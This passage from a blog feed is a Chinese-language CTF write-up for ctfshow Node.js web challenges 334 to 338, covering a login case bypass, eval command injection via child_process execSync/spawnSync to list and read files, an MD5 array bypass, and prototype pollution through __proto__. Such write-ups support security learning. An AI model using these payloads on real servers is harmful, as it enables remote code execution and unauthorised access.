            "content_html": "<h1 id=\"web-334\"><a class=\"anchor\" href=\"#web-334\">#</a> web 334</h1>\n<p>下载题目附件，得到两个 js 文件</p>\n<p>user.js</p>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>module<span class=\"token punctuation\">.</span>exports <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  <span class=\"token literal-property property\">items</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token punctuation\">{</span><span class=\"token literal-property property\">username</span><span class=\"token operator\">:</span> <span class=\"token string\">'CTFSHOW'</span><span class=\"token punctuation\">,</span> <span class=\"token literal-property property\">password</span><span class=\"token operator\">:</span> <span class=\"token string\">'123456'</span><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span></pre></td></tr></tbody></table></figure><p>login.js</p>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">var</span> express <span class=\"token operator\">=</span> <span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">'express'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">var</span> router <span class=\"token operator\">=</span> express<span class=\"token punctuation\">.</span><span class=\"token function\">Router</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">var</span> users <span class=\"token operator\">=</span> <span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">'../modules/user'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>items<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre> </pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">var</span> <span class=\"token function-variable function\">findUser</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">name<span class=\"token punctuation\">,</span> password</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token keyword\">return</span> users<span class=\"token punctuation\">.</span><span class=\"token function\">find</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">item</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">return</span> name<span class=\"token operator\">!==</span><span class=\"token string\">'CTFSHOW'</span> <span class=\"token operator\">&amp;&amp;</span> item<span class=\"token punctuation\">.</span>username <span class=\"token operator\">===</span> name<span class=\"token punctuation\">.</span><span class=\"token function\">toUpperCase</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> item<span class=\"token punctuation\">.</span>password <span class=\"token operator\">===</span> password<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token comment\">/* GET home page. */</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>router<span class=\"token punctuation\">.</span><span class=\"token function\">post</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/'</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">req<span class=\"token punctuation\">,</span> res<span class=\"token punctuation\">,</span> next</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  res<span class=\"token punctuation\">.</span><span class=\"token function\">type</span><span class=\"token punctuation\">(</span><span class=\"token string\">'html'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token keyword\">var</span> flag<span class=\"token operator\">=</span><span class=\"token string\">'flag_here'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  <span class=\"token keyword\">var</span> sess <span class=\"token operator\">=</span> req<span class=\"token punctuation\">.</span>session<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>  <span class=\"token keyword\">var</span> user <span class=\"token operator\">=</span> <span class=\"token function\">findUser</span><span class=\"token punctuation\">(</span>req<span class=\"token punctuation\">.</span>body<span class=\"token punctuation\">.</span>username<span class=\"token punctuation\">,</span> req<span class=\"token punctuation\">.</span>body<span class=\"token punctuation\">.</span>password<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre> </pre></td></tr><tr><td data-num=\"18\"></td><td><pre>  <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>user<span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    req<span class=\"token punctuation\">.</span>session<span class=\"token punctuation\">.</span><span class=\"token function\">regenerate</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">err</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>      <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>err<span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token keyword\">return</span> res<span class=\"token punctuation\">.</span><span class=\"token function\">json</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span><span class=\"token literal-property property\">ret_code</span><span class=\"token operator\">:</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token literal-property property\">ret_msg</span><span class=\"token operator\">:</span> <span class=\"token string\">'登录失败'</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>        </pre></td></tr><tr><td data-num=\"22\"></td><td><pre>      <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>       </pre></td></tr><tr><td data-num=\"24\"></td><td><pre>      req<span class=\"token punctuation\">.</span>session<span class=\"token punctuation\">.</span>loginUser <span class=\"token operator\">=</span> user<span class=\"token punctuation\">.</span>username<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>      res<span class=\"token punctuation\">.</span><span class=\"token function\">json</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span><span class=\"token literal-property property\">ret_code</span><span class=\"token operator\">:</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token literal-property property\">ret_msg</span><span class=\"token operator\">:</span> <span class=\"token string\">'登录成功'</span><span class=\"token punctuation\">,</span><span class=\"token literal-property property\">ret_flag</span><span class=\"token operator\">:</span>flag<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>              </pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>  <span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    res<span class=\"token punctuation\">.</span><span class=\"token function\">json</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span><span class=\"token literal-property property\">ret_code</span><span class=\"token operator\">:</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token literal-property property\">ret_msg</span><span class=\"token operator\">:</span> <span class=\"token string\">'账号或密码错误'</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>  <span class=\"token punctuation\">}</span>  </pre></td></tr><tr><td data-num=\"30\"></td><td><pre>  </pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>module<span class=\"token punctuation\">.</span>exports <span class=\"token operator\">=</span> router<span class=\"token punctuation\">;</span></pre></td></tr></tbody></table></figure><p>从代码中可以看到，当登录成功时，会返回 flag</p>\n<p>而判断是否登录正确的代码如下</p>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">var</span> <span class=\"token function-variable function\">findUser</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">name<span class=\"token punctuation\">,</span> password</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  <span class=\"token keyword\">return</span> users<span class=\"token punctuation\">.</span><span class=\"token function\">find</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">item</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">return</span> name<span class=\"token operator\">!==</span><span class=\"token string\">'CTFSHOW'</span> <span class=\"token operator\">&amp;&amp;</span> item<span class=\"token punctuation\">.</span>username <span class=\"token operator\">===</span> name<span class=\"token punctuation\">.</span><span class=\"token function\">toUpperCase</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> item<span class=\"token punctuation\">.</span>password <span class=\"token operator\">===</span> password<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span></pre></td></tr></tbody></table></figure><p>从 <code>return</code>  中，可以看到，要使得输入用户名不为 <code>CTFSHOW</code> , 但其全部大写等于原设置的用户名 (即 <code>CTFSHOW</code> ), 最后密码相等</p>\n<p>由 user.js, 可以知道用户名和密码分别为 <code>CTFSHOW</code>  和 <code>123456</code> , 而为了满足条件，可以将用户名其中一个字母变为小写输入提交</p>\n<p>如下所示</p>\n<p><img data-src=\"./../../../../post_images/ctfshow/Web-vip/web334_1.png\" alt=\"image-20230810195751429\"></p>\n<h1 id=\"web-335\"><a class=\"anchor\" href=\"#web-335\">#</a> web 335</h1>\n<pre><code>Node.js中的chile_process.exec调用的是/bash.sh，它是一个bash解释器，可以执行系统命令。\n在eval函数的参数中可以构造require('child_process').exec('');来进行调用。\n</code></pre>\n<p>使用 <code>exec</code>  返回 <code>[object Object]</code></p>\n<p>可替换用法  <code>execSync</code>   <code>spawnSync</code></p>\n<ol>\n<li>\n<p>使用 <code>execSync</code></p>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">'child_process'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">execSync</span><span class=\"token punctuation\">(</span><span class=\"token string\">'ls'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">'child_process'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">execSync</span><span class=\"token punctuation\">(</span><span class=\"token string\">'cat fl00g.txt'</span><span class=\"token punctuation\">)</span></pre></td></tr></tbody></table></figure></li>\n<li>\n<p>使用 <code>spawnSync</code></p>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">'child_process'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">spawnSync</span><span class=\"token punctuation\">(</span><span class=\"token string\">'ls'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>stdout<span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">'child_process'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">spawnSync</span><span class=\"token punctuation\">(</span><span class=\"token string\">'cat'</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">[</span><span class=\"token string\">'fl00g.txt'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>stdout<span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></tbody></table></figure></li>\n</ol>\n<h1 id=\"web-336\"><a class=\"anchor\" href=\"#web-336\">#</a> web 336</h1>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">'child_process'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">spawnSync</span><span class=\"token punctuation\">(</span><span class=\"token string\">'ls'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>stdout<span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">'child_process'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">spawnSync</span><span class=\"token punctuation\">(</span><span class=\"token string\">'cat'</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">[</span><span class=\"token string\">'fl001g.txt'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>stdout<span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></tbody></table></figure><h1 id=\"web-337\"><a class=\"anchor\" href=\"#web-337\">#</a> web 337</h1>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">var</span> express <span class=\"token operator\">=</span> <span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">'express'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">var</span> router <span class=\"token operator\">=</span> express<span class=\"token punctuation\">.</span><span class=\"token function\">Router</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">var</span> crypto <span class=\"token operator\">=</span> <span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">'crypto'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">s</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token keyword\">return</span> crypto<span class=\"token punctuation\">.</span><span class=\"token function\">createHash</span><span class=\"token punctuation\">(</span><span class=\"token string\">'md5'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token punctuation\">.</span><span class=\"token function\">update</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token punctuation\">.</span><span class=\"token function\">digest</span><span class=\"token punctuation\">(</span><span class=\"token string\">'hex'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token comment\">/* GET home page. */</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>router<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/'</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">req<span class=\"token punctuation\">,</span> res<span class=\"token punctuation\">,</span> next</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  res<span class=\"token punctuation\">.</span><span class=\"token function\">type</span><span class=\"token punctuation\">(</span><span class=\"token string\">'html'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token keyword\">var</span> flag<span class=\"token operator\">=</span><span class=\"token string\">'xxxxxxx'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  <span class=\"token keyword\">var</span> a <span class=\"token operator\">=</span> req<span class=\"token punctuation\">.</span>query<span class=\"token punctuation\">.</span>a<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>  <span class=\"token keyword\">var</span> b <span class=\"token operator\">=</span> req<span class=\"token punctuation\">.</span>query<span class=\"token punctuation\">.</span>b<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>  <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>a <span class=\"token operator\">&amp;&amp;</span> b <span class=\"token operator\">&amp;&amp;</span> a<span class=\"token punctuation\">.</span>length<span class=\"token operator\">===</span>b<span class=\"token punctuation\">.</span>length <span class=\"token operator\">&amp;&amp;</span> a<span class=\"token operator\">!==</span>b <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">md5</span><span class=\"token punctuation\">(</span>a<span class=\"token operator\">+</span>flag<span class=\"token punctuation\">)</span><span class=\"token operator\">===</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span>b<span class=\"token operator\">+</span>flag<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>  \tres<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>  <span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>  \tres<span class=\"token punctuation\">.</span><span class=\"token function\">render</span><span class=\"token punctuation\">(</span><span class=\"token string\">'index'</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">{</span> <span class=\"token literal-property property\">msg</span><span class=\"token operator\">:</span> <span class=\"token string\">'tql'</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>  <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>  </pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>module<span class=\"token punctuation\">.</span>exports <span class=\"token operator\">=</span> router<span class=\"token punctuation\">;</span></pre></td></tr></tbody></table></figure><p>md5 数组绕过</p>\n<pre><code>?a[]=1&amp;b[]=1\n</code></pre>\n<h1 id=\"web-338\"><a class=\"anchor\" href=\"#web-338\">#</a> web 338</h1>\n<p>题目给出了源码</p>\n<p>查阅 wp，知该题为 nodejs 原型污染</p>\n<h2 id=\"原型链污染\"><a class=\"anchor\" href=\"#原型链污染\">#</a> 原型链污染</h2>\n<p>Javascript 里每个类都有一个 <code>prototype</code>  的属性，用来绑定所有对象都会有变量与函数，对象的构造函数又指向类本身，同时对象的 <code>__proto__</code> 属性也指向类的 <code>prototype</code> 。因此，有以下关系：</p>\n<p><img data-src=\"./../../../../post_images/ctfshow/Web-vip/web334_2.png\" alt=\"web334_2\"></p>\n<p>并且，类的继承是通过原型链传递的，一个类的 <code>prototype</code>  属性指向其继承的类的一个对象。所以一个类的 <code>prototype.__proto__</code> 等于其父类的 <code>prototype</code> ，当然也等于该类对象的 <code>__proto__.__proto__</code> 属性。</p>\n<p>我们获取某个对象的某个成员时，如果找不到，就会通过原型链一步步往上找，直到某个父类的原型为 <code>null</code>  为止。所以修改对象的某个父类的 <code>prototype</code>  的原型就可以通过原型链影响到跟此类有关的所有对象。</p>\n<p><img data-src=\"./../../../../post_images/ctfshow/Web-vip/web334_3.png\" alt=\"web334_3\"></p>\n<p>而在源码中可以发现</p>\n<p>login.js</p>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">/* GET home page.  */</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>router<span class=\"token punctuation\">.</span><span class=\"token function\">post</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/'</span><span class=\"token punctuation\">,</span> <span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">'body-parser'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">json</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">req<span class=\"token punctuation\">,</span> res<span class=\"token punctuation\">,</span> next</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  res<span class=\"token punctuation\">.</span><span class=\"token function\">type</span><span class=\"token punctuation\">(</span><span class=\"token string\">'html'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token keyword\">var</span> flag<span class=\"token operator\">=</span><span class=\"token string\">'flag_here'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token keyword\">var</span> secert <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token keyword\">var</span> sess <span class=\"token operator\">=</span> req<span class=\"token punctuation\">.</span>session<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token keyword\">let</span> user <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  utils<span class=\"token punctuation\">.</span><span class=\"token function\">copy</span><span class=\"token punctuation\">(</span>user<span class=\"token punctuation\">,</span>req<span class=\"token punctuation\">.</span>body<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>secert<span class=\"token punctuation\">.</span>ctfshow<span class=\"token operator\">===</span><span class=\"token string\">'36dboy'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    res<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">return</span> res<span class=\"token punctuation\">.</span><span class=\"token function\">json</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span><span class=\"token literal-property property\">ret_code</span><span class=\"token operator\">:</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token literal-property property\">ret_msg</span><span class=\"token operator\">:</span> <span class=\"token string\">'登录失败'</span><span class=\"token operator\">+</span><span class=\"token constant\">JSON</span><span class=\"token punctuation\">.</span><span class=\"token function\">stringify</span><span class=\"token punctuation\">(</span>user<span class=\"token punctuation\">)</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  </pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  </pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></tbody></table></figure><p>copy 在 common.js 中</p>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>module<span class=\"token punctuation\">.</span>exports <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  <span class=\"token literal-property property\">copy</span><span class=\"token operator\">:</span>copy</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function\">copy</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">object1<span class=\"token punctuation\">,</span> object2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">let</span> key <span class=\"token keyword\">in</span> object2<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>key <span class=\"token keyword\">in</span> object2 <span class=\"token operator\">&amp;&amp;</span> key <span class=\"token keyword\">in</span> object1<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>            <span class=\"token function\">copy</span><span class=\"token punctuation\">(</span>object1<span class=\"token punctuation\">[</span>key<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> object2<span class=\"token punctuation\">[</span>key<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>            object1<span class=\"token punctuation\">[</span>key<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> object2<span class=\"token punctuation\">[</span>key<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token punctuation\">}</span></pre></td></tr></tbody></table></figure><p>由此，在上传登录的用户名密码信息时，copy 对其属性即值进行了复制，那么就可以通过抓包在 <code>__proto__</code> 增添 <code>ctfshow</code>  这一项的值，为 <code>36dboy</code></p>\n<p>抓包并修改提交的数据 data 如下 (即添加 <code>__proto_</code> 项)</p>\n<p><img data-src=\"./../../../../post_images/ctfshow/Web-vip/web_338_1.png\" alt=\"image-20230815011437707\"></p>\n",
            "tags": [
                "CTF",
                "ctfshow"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/f4477e43/",
            "url": "http://dpm12345.cn/posts/f4477e43/",
            "title": "Practical Volume-Hiding Encrypted Multi-Maps with Optimal",
            "date_published": "2023-07-30T12:28:35.000Z",
